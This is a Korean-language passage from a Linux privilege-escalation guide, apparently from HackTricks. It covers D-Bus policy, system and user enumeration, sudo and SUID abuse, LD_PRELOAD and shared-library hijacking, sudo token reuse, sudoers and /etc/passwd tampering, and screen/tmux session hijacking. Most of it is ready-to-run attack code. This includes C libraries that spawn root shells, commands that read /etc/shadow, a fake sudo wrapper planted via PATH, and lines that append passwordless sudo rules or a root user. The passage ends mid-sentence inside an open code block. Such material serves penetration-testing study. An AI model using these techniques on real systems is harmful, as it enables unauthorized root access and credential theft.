이 시스템은 기본 IPC를 지원하여 프로세스 간 데이터 교환을 촉진하며, **향상된 UNIX 도메인 소켓**과 유사한 방식으로 작동합니다. 또한 이벤트나 신호를 브로드캐스트하고 시스템 구성 요소 간의 원활한 통합을 촉진하여 사용자 경험을 향상시킵니다. 예를 들어, 블루투스 데몬에서 오는 전화 수신에 대한 신호는 음악 플레이어를 음소거하도록 유도하여 사용자 경험을 향상시킵니다. 또한 D-Bus는 원격 객체 시스템을 지원하여 응용 프로그램 간의 서비스 요청 및 메소드 호출을 간소화하여 기존에 복잡했던 프로세스를 간소화합니다.

D-Bus는 **허용/거부 모델**로 작동하여 일치하는 정책 규칙의 누적 효과에 따라 메시지 권한 (메소드 호출, 신호 발생 등)을 관리합니다. 이러한 권한의 악용을 통해 권한 상승이 가능할 수 있습니다.

`/etc/dbus-1/system.d/wpa_supplicant.conf`에 있는 정책의 예시는 루트 사용자가 `fi.w1.wpa_supplicant1`에게 소유권을 갖고 메시지를 보내고 받을 수 있는 권한을 상세히 설명합니다.

특정 사용자나 그룹이 지정되지 않은 정책은 보편적으로 적용되며, "default" 컨텍스트 정책은 다른 특정 정책에 포함되지 않은 모든 대상에 적용됩니다.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**여기서 D-Bus 통신을 열거하고 악용하는 방법을 배우세요:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **네트워크**

기계의 위치를 파악하고 네트워크를 열거하는 것은 항상 흥미로운 작업입니다.

### 일반적인 열거
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 오픈 포트

접근하기 전에 상호 작용할 수 없었던 머신에서 실행 중인 네트워크 서비스를 항상 확인하십시오:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### 스니핑

트래픽을 스니핑할 수 있는지 확인하십시오. 그렇다면 일부 자격 증명을 획득할 수 있습니다.
```
timeout 1 tcpdump
```
## 사용자

### 일반적인 열거

**누구**인지, 어떤 **권한**을 가지고 있는지, 시스템에 어떤 **사용자**가 있는지, 누가 **로그인**할 수 있는지, 그리고 누가 **루트 권한**을 가지고 있는지 확인하세요:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 큰 UID

일부 Linux 버전은 **UID > INT\_MAX**를 가진 사용자가 권한 상승을 할 수 있는 버그에 영향을 받았습니다. 자세한 정보: [여기](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [여기](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) 및 [여기](https://twitter.com/paragonsec/status/1071152249529884674).\
**`systemd-run -t /bin/bash`**를 사용하여 **이를 악용**하십시오.

### 그룹

루트 권한을 부여할 수 있는 **어떤 그룹의 구성원**인지 확인하십시오:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### 클립보드

클립보드 내에 흥미로운 내용이 있는지 확인하십시오 (가능한 경우)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 비밀번호 정책
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 알려진 암호

환경의 **암호를 알고 있다면** 각 사용자로 로그인을 시도해보세요.

### Su 브루트

많은 소음을 일으키는 것에 상관하지 않고 `su`와 `timeout` 이진 파일이 컴퓨터에 존재하는 경우, [su-bruteforce](https://github.com/carlospolop/su-bruteforce)를 사용하여 사용자를 브루트 포스할 수 있습니다.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)는 `-a` 매개변수와 함께 사용자를 브루트 포스할 수도 있습니다.

## 쓰기 가능한 PATH 남용

### $PATH

$PATH의 일부 폴더에 **쓰기 권한이 있는 것을 발견하면**, 쓰기 가능한 폴더 내에 **백도어를 생성**하여 루트와 같은 다른 사용자(이상적으로는 루트)가 실행할 명령어의 이름으로 설정할 수 있습니다. 이때, 해당 명령어는 $PATH에서 쓰기 가능한 폴더 이전에 위치한 폴더에서 로드되지 않아야 합니다.

### SUDO 및 SUID

sudo를 사용하여 명령어를 실행할 수 있거나 suid 비트가 설정되어 있을 수 있습니다. 다음을 사용하여 확인할 수 있습니다:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
일부 **예상치 못한 명령어는 파일을 읽거나/쓰거나 심지어 명령을 실행할 수 있게 합니다.** 예를 들어:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 구성은 사용자가 비밀번호를 알지 못해도 다른 사용자의 권한으로 명령을 실행할 수 있도록 할 수 있습니다.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
다음 예제에서 사용자 `demo`는 `root`로 `vim`을 실행할 수 있습니다. 이제 루트 디렉토리에 ssh 키를 추가하거나 `sh`를 호출하여 쉘을 얻는 것이 쉬워졌습니다.
```
sudo vim -c '!sh'
```
### SETENV

이 지시문은 사용자가 무언가를 실행하는 동안 **환경 변수를 설정**할 수 있게 합니다:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
이 예제는 **HTB 머신 Admirer를 기반**으로 하며, 루트로 스크립트를 실행하는 동안 **PYTHONPATH 하이재킹**에 취약했습니다.
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo 실행 경로 우회

**점프**하여 다른 파일을 읽거나 **심볼릭 링크**를 사용합니다. 예를 들어 sudoers 파일에서: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
만약 **와일드카드**가 사용된다면 (\*), 더 쉬워집니다:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**대응책**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo 명령어/SUID 이진 파일 경로 미지정

만약 **sudo 권한**이 경로를 지정하지 않고 **단일 명령어에 부여**된 경우: _hacker10 ALL= (root) less_ PATH 변수를 변경하여 이를 악용할 수 있습니다.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
이 기술은 **경로를 지정하지 않고 다른 명령을 실행하는 경우에도 사용할 수 있습니다 (항상 이상한 SUID 이진 파일의 내용을** _**strings**_ **로 확인하십시오)**.

[실행할 페이로드 예제](payloads-to-execute.md)

### 명령 경로가 지정된 SUID 이진 파일

만약 **suid** 이진 파일이 **경로를 지정하여 다른 명령을 실행하는 경우**, 그러면 suid 파일이 호출하는 명령과 동일한 이름의 함수를 **내보내는 시도**를 할 수 있습니다.

예를 들어, suid 이진 파일이 _**/usr/sbin/service apache2 start**_를 호출하는 경우 해당 함수를 만들고 내보내야 합니다:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD\_PRELOAD** 환경 변수는 로더에 의해 표준 C 라이브러리 (`libc.so`)를 포함한 다른 모든 라이브러리보다 먼저 로드되어야 하는 하나 이상의 공유 라이브러리 (.so 파일)를 지정하는 데 사용됩니다. 이 프로세스는 라이브러리를 사전로드하는 것으로 알려져 있습니다.

그러나 시스템 보안을 유지하고 특히 **suid/sgid** 실행 파일에서 이 기능이 악용되는 것을 방지하기 위해 시스템은 특정 조건을 강제합니다:

* 로더는 실제 사용자 ID (_ruid_)가 유효 사용자 ID (_euid_)와 일치하지 않는 실행 파일에서 **LD\_PRELOAD**를 무시합니다.
* suid/sgid를 가진 실행 파일의 경우 사전로드되는 라이브러리는 표준 경로에만 있고 suid/sgid도 있어야 합니다.

`sudo`를 사용하여 명령을 실행할 수 있는 능력이 있고 `sudo -l`의 출력에 **env\_keep+=LD\_PRELOAD** 문이 포함되어 있는 경우 권한 상승이 발생할 수 있습니다. 이 구성은 **LD\_PRELOAD** 환경 변수가 `sudo`로 실행되는 명령에서도 지속되고 인식되도록 허용하여 권한이 상승된 상태에서 임의의 코드를 실행할 수 있게 할 수 있습니다.
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c**로 저장하세요.
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
그럼 다음과 같이 **컴파일**하십시오:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
마침내 **권한 상승**을 실행합니다.
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
만약 공격자가 **LD\_LIBRARY\_PATH** 환경 변수를 제어한다면, 라이브러리가 검색될 경로를 제어할 수 있어 유사한 권한 상승이 악용될 수 있습니다.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

특이한 **SUID** 권한을 갖는 이진 파일을 만났을 때, **.so** 파일을 올바르게 로드하는지 확인하는 것이 좋은 실천 방법입니다. 다음 명령을 실행하여 확인할 수 있습니다:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
예를 들어, _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)"_와 같은 오류를 만나면 잠재적인 악용 가능성이 시사됩니다.

이를 악용하기 위해, 다음 코드를 포함하는 C 파일인 _"/path/to/.config/libcalc.c"_를 생성한 다음 다음 단계를 따릅니다:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
이 코드는 컴파일 및 실행되면 파일 권한을 조작하고 권한을 상승시켜 셸을 실행하는 것을 목표로 합니다.

위의 C 파일을 공유 객체 (.so) 파일로 컴파일하려면:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
## 공유 객체 납치
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
이제 우리는 쓸 수 있는 폴더에서 라이브러리를 불러오는 SUID 이진 파일을 찾았으니, 해당 폴더에 필요한 이름으로 라이브러리를 생성합시다:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
만약 다음과 같은 오류가 발생한다면
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
그것은 생성된 라이브러리가 `a_function_name`이라는 함수를 가져야 한다는 것을 의미합니다.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io)은 로컬 보안 제한을 우회하기 위해 공격자가 악용할 수 있는 Unix 이진 파일의 선별된 목록입니다. [**GTFOArgs**](https://gtfoargs.github.io/)는 **명령에 인수를 주입할 수 있는 경우**에 대한 것입니다.

이 프로젝트는 Unix 이진 파일의 합법적인 기능을 수집하여 제한된 쉘을 탈출하거나 권한을 상승하거나 유지하거나 파일을 전송하거나 bind 및 역술을 생성하거나 다른 사후 침투 작업을 용이하게 합니다.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

만약 `sudo -l`에 접근할 수 있다면 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 도구를 사용하여 어떤 sudo 규칙을 악용할 수 있는지 확인할 수 있습니다.

### Sudo 토큰 재사용

**sudo 액세스**가 있지만 비밀번호가 없는 경우, **sudo 명령 실행을 기다린 다음 세션 토큰을 탈취**하여 권한을 상승할 수 있습니다.

권한 상승을 위한 요구 사항:

* 이미 "_sampleuser_" 사용자로 쉘을 보유하고 있어야 합니다.
* "_sampleuser_"가 **마지막 15분 동안 `sudo`를 사용**하여 무언가를 실행했어야 합니다 (`sudo`를 사용하여 비밀번호를 입력하지 않고 사용할 수 있는 sudo 토큰의 기간이 기본적으로 15분입니다).
* `cat /proc/sys/kernel/yama/ptrace_scope`가 0이어야 합니다.
* `gdb`에 액세스할 수 있어야 합니다 (업로드할 수 있어야 합니다).

(임시로 `ptrace_scope`를 활성화하려면 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`를 사용하거나 `/etc/sysctl.d/10-ptrace.conf`를 수정하여 `kernel.yama.ptrace_scope = 0`로 설정하십시오)

위의 모든 요구 사항이 충족되면, **다음을 사용하여 권한을 상승할 수 있습니다:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **첫 번째 exploit** (`exploit.sh`)은 _/tmp/_에 `activate_sudo_token` 바이너리를 생성합니다. 이를 사용하여 **세션에서 sudo 토큰을 활성화**할 수 있습니다 (자동으로 루트 쉘을 얻지 못하므로 `sudo su`를 실행하십시오):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* 두 번째 exploit (`exploit_v2.sh`)은 _/tmp_에 소유자가 root이고 setuid가 설정된 sh 셸을 생성합니다.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* **세 번째 악용** (`exploit_v3.sh`)은 **sudo 토큰을 영구적으로 만들고 모든 사용자가 sudo를 사용할 수 있게 하는 sudoers 파일을 생성**합니다
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<사용자명>

만약 해당 폴더나 폴더 내 생성된 파일 중 어느 것이든 **쓰기 권한**이 있다면, [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) 바이너리를 사용하여 **사용자 및 PID에 대한 sudo 토큰을 생성**할 수 있습니다.\
예를 들어, _/var/run/sudo/ts/sampleuser_ 파일을 덮어쓸 수 있고 PID가 1234인 해당 사용자의 쉘을 가지고 있다면, 다음을 수행하여 **비밀번호를 알 필요 없이 sudo 권한을 얻을 수** 있습니다:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

파일 `/etc/sudoers`와 `/etc/sudoers.d` 내부의 파일들은 `sudo`를 사용할 수 있는 사용자와 방법을 구성합니다. 이러한 파일들은 **기본적으로 root 사용자와 root 그룹만이 읽을 수 있습니다**.\
만약 **이 파일을 읽을 수 있다면**, **일부 흥미로운 정보를 얻을 수 있을 것**이며, 만약 **어떤 파일이든 쓸 수 있다면** 권한 상승을 할 수 있을 것입니다.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
만약 당신이 쓸 수 있다면, 이 권한을 남용할 수 있습니다.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
다음은 이 권한을 남용하는 또 다른 방법입니다:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` 바이너리에 대한 `doas`와 같은 대안들이 있습니다. OpenBSD의 경우, `/etc/doas.conf`에서 그 구성을 확인하는 것을 기억하세요.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

만약 **사용자가 일반적으로 머신에 연결하고 `sudo`를 사용하여 권한을 상승**시킨다는 것을 알고 있고 해당 사용자 컨텍스트 내에서 쉘을 획득했다면, **루트로 코드를 실행하고 사용자의 명령을 실행할 새로운 sudo 실행 파일**을 생성할 수 있습니다. 그런 다음, 사용자 컨텍스트의 $PATH를 수정하여 (예: .bash\_profile에 새 경로 추가) 사용자가 sudo를 실행할 때 새로운 sudo 실행 파일이 실행되도록 할 수 있습니다.

사용자가 다른 쉘(배시가 아닌)을 사용하는 경우, 새 경로를 추가하기 위해 다른 파일을 수정해야 합니다. 예를 들어 [sudo-piggyback](https://github.com/APTy/sudo-piggyback)은 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`을 수정합니다. [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)에서 다른 예제를 찾을 수 있습니다.

또는 다음과 같이 실행할 수 있습니다:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 공유 라이브러리

### ld.so

`/etc/ld.so.conf` 파일은 **로드된 구성 파일이 어디에서 왔는지**를 나타냅니다. 일반적으로, 이 파일에는 다음 경로가 포함되어 있습니다: `include /etc/ld.so.conf.d/*.conf`

즉, `/etc/ld.so.conf.d/*.conf`에서 구성 파일이 읽힐 것입니다. 이 구성 파일은 **라이브러리가 검색될 다른 폴더를 가리킵니다**. 예를 들어, `/etc/ld.so.conf.d/libc.conf`의 내용은 `/usr/local/lib`입니다. **이는 시스템이 `/usr/local/lib` 내부의 라이브러리를 검색할 것을 의미합니다**.

어떤 이유로든지 **사용자가 `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` 내의 파일 또는 `/etc/ld.so.conf.d/*.conf` 내의 구성 파일 내의 폴더 중 어느 것이든 쓰기 권한을 가지고 있다면** 권한 상승을 할 수 있을 수 있습니다.\
다음 페이지에서 **이 구성 오류를 악용하는 방법**을 살펴보세요:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`/var/tmp/flag15/`로 lib를 복사하면 프로그램에서 `RPATH` 변수에 지정된 대로 해당 위치에서 사용됩니다.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
그럼 `/var/tmp`에 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` 명령어로 악의적인 라이브러리를 생성하세요.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 기능

Linux 기능은 **프로세스에 사용 가능한 루트 권한의 일부분**을 제공합니다. 이는 루트 **권한을 더 작고 구별 가능한 단위로 분할**하는 효과가 있습니다. 이러한 각 단위는 프로세스에 독립적으로 부여될 수 있습니다. 이렇게 하면 권한 집합이 축소되어 공격 위험이 감소합니다.\
기능에 대해 더 자세히 알아보려면 다음 페이지를 **읽어보세요**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## 디렉토리 권한

디렉토리에서 **"실행" 비트**는 영향 받는 사용자가 폴더로 "**cd**"할 수 있다는 것을 의미합니다.\
**"읽기"** 비트는 사용자가 **파일을 나열**할 수 있다는 것을 의미하며, **"쓰기"** 비트는 사용자가 **파일을 삭제**하고 **새 파일을 생성**할 수 있다는 것을 의미합니다.

## ACLs

액세스 제어 목록 (ACL)은 전통적인 ugo/rwx 권한을 **재정의할 수 있는** 이차적인 재량적 권한을 나타냅니다. 이러한 권한은 파일이나 디렉토리 액세스를 더 잘 제어하기 위해 특정 사용자에게 특정 권한을 허용하거나 거부합니다. 이러한 **세분화된 수준은 더 정확한 액세스 관리**를 보장합니다. 자세한 내용은 [**여기**](https://linuxconfig.org/how-to-manage-acls-on-linux)에서 확인할 수 있습니다.

**사용자 "kali"에게 파일에 대한 읽기 및 쓰기 권한을 부여하세요**:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**시스템에서** 특정 ACL이 적용된 파일을 **가져오세요**:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 셸 세션 열기

**이전 버전**에서는 다른 사용자(**root**)의 일부 **셸 세션을 탈취**할 수 있습니다.\
**최신 버전**에서는 **자신의 사용자**의 스크린 세션에만 **연결**할 수 있습니다. 그러나 세션 내부에 **흥미로운 정보**를 찾을 수 있습니다.

### 스크린 세션 탈취

**스크린 세션 목록**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (141).png>)

**세션에 연결하기**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux 세션 탈취

이것은 **이전 tmux 버전**에서 발생한 문제였습니다. 나는 특권이 없는 사용자로서 루트가 생성한 tmux (v2.1) 세션을 탈취할 수 없었습니다.

**tmux 세션 목록**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (837).png>)

**세션에 연결하기**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

모든 SSL 및 SSH 키가 영향을 받을 수 있습니다. 이 버그는 해당 OS에서 새로운 ssh 키를 생성할 때 발생하며 **32,768가지 변형만 가능했기 때문에** 발생합니다. 이는 모든 가능성을 계산할 수 있으며 **ssh 공개 키를 가지고 해당 개인 키를 찾을 수 있습니다**. 계산된 가능성은 여기에서 찾을 수 있습니다: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH 흥미로운 구성 값

* **PasswordAuthentication:** 암호 인증이 허용되는지 여부를 지정합니다. 기본값은 `no`입니다.
* **PubkeyAuthentication:** 공개 키 인증이 허용되는지 여부를 지정합니다. 기본값은 `yes`입니다.
* **PermitEmptyPasswords**: 암호 인증이 허용되는 경우, 서버가 빈 암호 문자열을 가진 계정으로 로그인을 허용하는지를 지정합니다. 기본값은 `no`입니다.

### PermitRootLogin

루트가 ssh를 통해 로그인할 수 있는지 여부를 지정합니다. 기본값은 `no`입니다. 가능한 값:

* `yes`: 루트는 암호 및 개인 키를 사용하여 로그인할 수 있습니다.
* `without-password` 또는 `prohibit-password`: 루트는 개인 키로만 로그인할 수 있습니다.
* `forced-commands-only`: 루트는 개인 키를 사용하고 명령 옵션이 지정된 경우에만 로그인할 수 있습니다.
* `no` : 아니요

### AuthorizedKeysFile

사용자 인증에 사용할 수 있는 공개 키가 포함된 파일을 지정합니다. `%h`와 같은 토큰을 포함할 수 있습니다. 이는 홈 디렉토리로 대체됩니다. **절대 경로** (시작 위치 `/`)나 **사용자의 홈으로부터의 상대 경로**를 지정할 수 있습니다. 예:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
해당 구성은 사용자 "**testusername**"의 **개인** 키로 로그인을 시도하면 ssh가 키의 공개 키를 `/home/testusername/.ssh/authorized_keys` 및 `/home/testusername/access`에 위치한 키와 비교하도록 지시합니다.

### ForwardAgent/AllowAgentForwarding

SSH 에이전트 포워딩을 사용하면 서버에 (암호 없이!) 키를 두는 대신 **로컬 SSH 키를 사용**할 수 있습니다. 따라서 ssh를 통해 **호스트로 점프**한 다음 초기 호스트에 위치한 **키를 사용하여** 다른 호스트로 **점프**할 수 있습니다.

이 옵션을 `$HOME/.ssh.config`에 다음과 같이 설정해야 합니다:
```
Host example.com
ForwardAgent yes
```
`Host`가 `*`인 경우 사용자가 다른 기계로 이동할 때마다 해당 호스트가 키에 액세스할 수 있게 됩니다 (보안 문제).

파일 `/etc/ssh_config`은 **이 옵션을 재정의**하여 이 구성을 허용하거나 거부할 수 있습니다.\
파일 `/etc/sshd_config`은 `AllowAgentForwarding` 키워드로 ssh-agent 전달을 **허용**하거나 **거부**할 수 있습니다 (기본값은 허용).

환경에서 Forward Agent가 구성된 것을 발견하면 다음 페이지를 읽어보세요. **권한 상승을 악용할 수 있습니다**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## 흥미로운 파일

### 프로필 파일

파일 `/etc/profile` 및 `/etc/profile.d/` 하위 파일들은 **사용자가 새 셸을 실행할 때 실행되는 스크립트**입니다. 따라서 이러한 파일 중 하나를 **작성하거나 수정할 수 있다면 권한을 상승**시킬 수 있습니다.
```bash
ls -l /etc/profile /etc/profile.d/
```
만약 이상한 프로필 스크립트가 발견된다면 **민감한 세부 정보**를 확인해야 합니다.

### Passwd/Shadow Files

운영 체제에 따라 `/etc/passwd` 및 `/etc/shadow` 파일의 이름이 다를 수 있거나 백업 파일이 있을 수 있습니다. 따라서 **모두 찾아서** 읽을 수 있는지 확인하여 파일 안에 **해시 값이 있는지 확인하는 것이 권장**됩니다:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
가끔 `/etc/passwd` (또는 해당 파일) 내부에서 **비밀번호 해시**를 찾을 수 있습니다.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 쓰기 가능한 /etc/passwd

먼저 다음 명령어 중 하나를 사용하여 암호를 생성하십시오.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
그런 다음 사용자 `hacker`를 추가하고 생성된 비밀번호를 추가하십시오.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
예: `해커:$1$해커$TzyKlv0/R/c28R.GAeLw.1:0:0:해커:/root:/bin/bash`

이제 `su` 명령어를 `해커:해커`로 사용할 수 있습니다.

또는 다음 라인을 사용하여 패스워드가 없는 더미 사용자를 추가할 수 있습니다.\
경고: 현재 기계의 보안 수준이 낮아질 수 있습니다.
```
